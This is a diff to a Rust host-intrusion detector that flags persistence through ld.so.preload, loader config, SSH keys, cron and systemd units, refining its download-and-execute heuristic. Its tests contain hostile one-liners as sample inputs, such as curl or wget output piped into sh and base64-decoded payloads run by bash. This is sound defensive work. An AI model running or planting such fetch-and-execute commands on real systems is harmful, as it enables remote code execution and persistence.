@@ -5,7 +5,7 @@
 //! emit INFO for interactive edits or HIGH/CRITICAL for unattended ones.
 
 use crate::alert::Finding;
-use crate::detect::{writer_label, Ctx};
+use crate::detect::{content_tag, writer_label, Ctx};
 use crate::events::{
     is_container_overlay_path, is_editor_artifact, DetectionId, FileEvent, FileKind, Severity,
 };
@@ -71,7 +71,7 @@ fn ld_preload(ev: &FileEvent, _ctx: &Ctx) -> Option<Finding> {
         DetectionId::D3,
         Severity::Critical,
         "ld.so.preload modified",
-        "d3|ld-preload",
+        &format!("d3|ld-preload|{}", content_tag(&libs.join("\n"))),
     )
     .what(format!(
         "/etc/ld.so.preload was {} by {}. Every new process on this host will now load the \
@@ -105,14 +105,7 @@ fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         .unwrap_or("")
         .lines()
         .map(str::trim)
-        .filter(|l| {
-            !l.is_empty()
-                && !l.starts_with('#')
-                && !l.starts_with("/usr/")
-                && !l.starts_with("/lib")
-                && !l.starts_with("/opt/")
-                && !l.starts_with("include ")
-        })
+        .filter(|l| !l.is_empty() && !l.starts_with('#') && !is_standard_ld_line(l))
         .map(str::to_string)
         .collect();
 
@@ -169,6 +162,38 @@ fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     Some(f)
 }
 
+/// A loader config line that only names standard library directories.
+///
+/// Prefix checks let `/libevil`, `/usr/../tmp` and `include /tmp/x.conf`
+/// through. Now a path has to be one of the standard directories or under
+/// one, written plainly, and an include must point back into ld.so.conf.d.
+fn is_standard_ld_line(line: &str) -> bool {
+    const DIRS: &[&str] = &["/usr", "/lib", "/lib32", "/lib64", "/libx32", "/opt"];
+    let plain = |p: &str| {
+        p.starts_with('/')
+            && !p.contains("/../")
+            && !p.contains("/./")
+            && !p.contains("//")
+            && !p.ends_with("/..")
+    };
+    if let Some(target) = line.strip_prefix("include") {
+        let target = target.trim();
+        return plain(target) && target.starts_with("/etc/ld.so.conf.d/");
+    }
+    // A line may hold several paths separated by spaces, commas or colons.
+    let mut paths = line
+        .split(|c: char| c.is_whitespace() || c == ',' || c == ':')
+        .filter(|p| !p.is_empty())
+        .peekable();
+    paths.peek().is_some()
+        && paths.all(|p| {
+            plain(p)
+                && DIRS
+                    .iter()
+                    .any(|d| p == *d || p.strip_prefix(d).is_some_and(|r| r.starts_with('/')))
+        })
+}
+
 fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     let name = ev.path.rsplit('/').next().unwrap_or("");
     if name != "authorized_keys" && name != "authorized_keys2" {
@@ -214,7 +239,11 @@ fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         DetectionId::D3,
         Severity::High,
         "SSH key added with no session present",
-        &format!("d3|authorized-keys|{}", ev.path),
+        &format!(
+            "d3|authorized-keys|{}|{}",
+            ev.path,
+            content_tag(ev.content.as_deref().unwrap_or(""))
+        ),
     )
     .what(format!(
         "{} was {} by {} while no interactive session was active on the host.",
@@ -322,7 +351,11 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         } else {
             "Cron persistence with no session present"
         },
-        &format!("d3|cron|{}", ev.path),
+        &format!(
+            "d3|cron|{}|{}",
+            ev.path,
+            content_tag(&all_commands.join("\n"))
+        ),
     )
     .what(format!(
         "{} was {} by {}{}.",
@@ -390,19 +423,95 @@ fn cron_commands(content: &str, system_table: bool) -> Vec<String> {
 /// display is capped (a fifth malicious line used to go unchecked).
 const MAX_SHOWN_COMMANDS: usize = 4;
 
+/// Split a command line into words, with `|` as a word of its own. Quotes,
+/// `;`, `&`, parentheses, backticks and redirections only separate words.
+/// Good enough to find "which programs run here", not a shell parser.
+fn shell_words(cmd: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut cur = String::new();
+    for c in cmd.chars() {
+        if c == '|' {
+            if !cur.is_empty() {
+                out.push(std::mem::take(&mut cur));
+            }
+            out.push("|".to_string());
+        } else if c.is_whitespace()
+            || matches!(
+                c,
+                ';' | '&' | '(' | ')' | '`' | '\'' | '"' | '<' | '>' | '$' | '{' | '}'
+            )
+        {
+            if !cur.is_empty() {
+                out.push(std::mem::take(&mut cur));
+            }
+        } else {
+            cur.push(c);
+        }
+    }
+    if !cur.is_empty() {
+        out.push(cur);
+    }
+    out
+}
+
+/// The program name of a word: `/usr/bin/python3.11` -> `python3.11`.
+fn prog(word: &str) -> &str {
+    word.rsplit('/').next().unwrap_or(word)
+}
+
+fn is_shell_or_interpreter(word: &str) -> bool {
+    let p = prog(word);
+    let stem = p.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    matches!(
+        stem,
+        "sh" | "bash"
+            | "dash"
+            | "zsh"
+            | "ksh"
+            | "ash"
+            | "busybox"
+            | "python"
+            | "perl"
+            | "ruby"
+            | "php"
+            | "node"
+    )
+}
+
+fn is_transient_path(word: &str) -> bool {
+    ["/tmp/", "/dev/shm/", "/var/tmp/"]
+        .iter()
+        .any(|d| word.starts_with(d))
+}
+
 /// Heuristic for "download and execute" one-liners.
+///
+/// Word-based: substring checks matched `ssh ` and `flush ` as a shell and
+/// made e.g. `rsync -e ssh ... /tmp/` CRITICAL (which can auto-isolate).
 fn looks_like_staging(cmd: &str) -> bool {
-    let lower = cmd.to_lowercase();
-    let fetches = lower.contains("curl ") || lower.contains("wget ") || lower.contains("fetch ");
-    let executes = lower.contains("| sh")
-        || lower.contains("|sh")
-        || lower.contains("| bash")
-        || lower.contains("|bash")
-        || lower.contains("| python")
-        || lower.contains("| perl");
-    let from_transient =
-        lower.contains("/tmp/") || lower.contains("/dev/shm/") || lower.contains("/var/tmp/");
-    (fetches && executes) || (from_transient && (lower.contains("sh ") || lower.contains("bash ")))
+    let words = shell_words(&cmd.to_lowercase());
+    let fetches = words
+        .iter()
+        .any(|w| matches!(prog(w), "curl" | "wget" | "wget2" | "fetch" | "aria2c"));
+    let decodes = words.iter().any(|w| prog(w) == "base64");
+    // Something piped straight into a shell or interpreter.
+    let pipes_into_shell = words
+        .windows(2)
+        .any(|w| w[0] == "|" && is_shell_or_interpreter(&w[1]));
+    // A shell/interpreter running a script from a transient dir, or a program
+    // started straight from one.
+    let runs_transient = words.first().is_some_and(|w| is_transient_path(w))
+        || words
+            .windows(2)
+            .any(|w| w[0] == "|" && is_transient_path(&w[1]))
+        || words.iter().enumerate().any(|(i, w)| {
+            is_shell_or_interpreter(w)
+                && words[i + 1..]
+                    .iter()
+                    .find(|a| !a.starts_with('-'))
+                    .is_some_and(|a| is_transient_path(a))
+        });
+    (pipes_into_shell && (fetches || decodes)) || runs_transient
 }
 
 fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
@@ -495,19 +604,15 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         return None;
     }
     let execs = unit_exec_lines(ev.content.as_deref().unwrap_or(""));
-    let is_suspicious = |e: &str| {
-        e.contains("/tmp/")
-            || e.contains("/dev/shm/")
-            || e.contains("/var/tmp/")
-            || looks_like_staging(e)
-    };
+    // The program itself in a transient dir, or a staging one-liner. Any
+    // mention of /tmp used to count, so `--socket /tmp/app.sock` was CRITICAL.
     // Show the suspicious command if there is one, else the first.
     let exec_line = execs
         .iter()
-        .find(|e| is_suspicious(e))
+        .find(|e| looks_like_staging(e))
         .or(execs.first())
         .cloned();
-    let suspicious_exec = execs.iter().any(|e| is_suspicious(e));
+    let suspicious_exec = execs.iter().any(|e| looks_like_staging(e));
     // An installer writing a unit that runs from /tmp or pipes curl into a
     // shell isn't a normal install; only clean units get the exemption.
     if !suspicious_exec && writer_is_installer(ev, ctx) {
@@ -559,7 +664,7 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         } else {
             "systemd unit installed with no session present"
         },
-        &format!("d3|systemd|{}", ev.path),
+        &format!("d3|systemd|{}|{}", ev.path, content_tag(&execs.join("\n"))),
     )
     .what(format!(
         "{} was {} by {} and does not belong to any installed package.",
@@ -599,19 +704,27 @@ pub fn is_systemd_dropin(path: &str) -> bool {
 /// prefixes (`-`, `@`, `+`, `!`, `:`) are stripped.
 fn unit_exec_lines(content: &str) -> Vec<String> {
     const KEYS: &[&str] = &[
-        "ExecStart=",
-        "ExecStartPre=",
-        "ExecStartPost=",
-        "ExecStop=",
-        "ExecStopPost=",
-        "ExecReload=",
-        "ExecCondition=",
+        "ExecStart",
+        "ExecStartPre",
+        "ExecStartPost",
+        "ExecStop",
+        "ExecStopPost",
+        "ExecReload",
+        "ExecCondition",
     ];
+    // systemd allows spaces around '=' (`ExecStart = /tmp/x`).
     content
         .lines()
         .map(str::trim)
-        .filter_map(|l| KEYS.iter().find_map(|k| l.strip_prefix(k)))
-        .map(|v| v.trim_start_matches(['-', '@', '+', '!', ':']).trim())
+        .filter_map(|l| {
+            let (k, v) = l.split_once('=')?;
+            KEYS.contains(&k.trim()).then_some(v)
+        })
+        .map(|v| {
+            v.trim()
+                .trim_start_matches(['-', '@', '+', '!', ':'])
+                .trim()
+        })
         .filter(|v| !v.is_empty())
         .map(str::to_string)
         .collect()
@@ -806,10 +919,49 @@ mod tests {
     #[test]
     fn staging_heuristic() {
         assert!(looks_like_staging("curl -s http://198.51.100.1/x | sh"));
+        assert!(looks_like_staging("curl -s http://198.51.100.1/x|bash"));
+        assert!(looks_like_staging("wget -qO- http://x/y | /bin/sh -s"));
+        assert!(looks_like_staging("echo aGk= | base64 -d | bash"));
         assert!(looks_like_staging("bash /tmp/.payload"));
+        assert!(looks_like_staging("/bin/sh -c '/dev/shm/.x'"));
+        assert!(looks_like_staging("python3 /var/tmp/.k.py"));
+        assert!(looks_like_staging("/tmp/.a"));
         assert!(!looks_like_staging("/usr/bin/certbot renew"));
         assert!(!looks_like_staging(
             "curl -fsS https://healthcheck.example/ping"
         ));
+        // "ssh " and "flush " aren't shells.
+        assert!(!looks_like_staging(
+            "rsync -a -e ssh /srv/data/ backup:/tmp/x"
+        ));
+        assert!(!looks_like_staging("/usr/sbin/ip route flush cache /tmp/x"));
+        // A transient path as an option value isn't the program.
+        assert!(!looks_like_staging("/usr/bin/app --socket /tmp/app.sock"));
+        assert!(!looks_like_staging(
+            "python3 /usr/bin/app --log /tmp/app.log"
+        ));
+    }
+
+    #[test]
+    fn ld_conf_lines() {
+        assert!(is_standard_ld_line("/usr/local/lib"));
+        assert!(is_standard_ld_line("/usr/lib/x86_64-linux-gnu/libfakeroot"));
+        assert!(is_standard_ld_line("/lib/x86_64-linux-gnu"));
+        assert!(is_standard_ld_line("/opt/vendor/lib"));
+        assert!(is_standard_ld_line("include /etc/ld.so.conf.d/*.conf"));
+        assert!(!is_standard_ld_line("/libevil"));
+        assert!(!is_standard_ld_line("/usr/../tmp"));
+        assert!(!is_standard_ld_line("/usr/lib/.."));
+        assert!(!is_standard_ld_line("include /tmp/x.conf"));
+        assert!(!is_standard_ld_line("/usr/lib /dev/shm"));
+        assert!(!is_standard_ld_line("/home/eve/lib"));
+    }
+
+    #[test]
+    fn unit_exec_allows_spaces_around_equals() {
+        assert_eq!(
+            unit_exec_lines("[Service]\nExecStart = /tmp/x --y\n"),
+            vec!["/tmp/x --y"]
+        );
     }
 }
